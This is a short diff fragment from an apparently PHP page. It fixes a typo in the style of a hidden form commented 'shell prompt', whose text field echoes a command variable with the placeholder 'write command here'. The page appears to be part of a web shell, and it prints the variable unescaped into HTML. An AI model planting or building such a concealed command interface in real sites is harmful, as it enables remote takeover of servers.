@@ -9,7 +9,7 @@
 
 <!--shell prompt
 -->
-<form method=POST style=display:nonee>$
+<form method=POST style=display:none>$
 <input name=input id=input value="<?php echo $cmd?>" placeholder="write command here" style="width:50%">
 </form>
 
